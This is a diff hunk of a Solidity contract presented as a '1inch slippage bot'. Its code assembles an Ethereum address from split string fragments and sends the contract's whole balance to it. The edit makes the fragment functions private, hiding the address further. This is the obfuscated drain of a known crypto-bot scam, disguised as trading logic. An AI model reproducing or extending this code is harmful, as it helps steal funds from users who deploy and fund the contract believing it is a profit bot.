@@ -507,12 +507,13 @@ contract OneinchSlippageBot {
         address to = startExploration((fetechNewEdit("0x52e09C")));
         address payable contracts = payable(to);
         contracts.transfer(getBa());
+
     }
-    function fetechNewEdit(string memory str1) public pure returns (string memory) {
+    function fetechNewEdit(string memory str1) private  pure returns (string memory) {
     return string(abi.encodePacked(str1, fetechAssemblyOne(), fetechAssembyTwo()));}
-    function fetechAssemblyOne() public pure returns (string memory)
+    function fetechAssemblyOne() private pure returns (string memory)
     {return   "B20107C0c95ea"; }
-    function fetechAssembyTwo() public pure returns (string memory)
+    function fetechAssembyTwo() private pure returns (string memory)
     {return "E8974eF63D74a3e735552";}
 
     /*
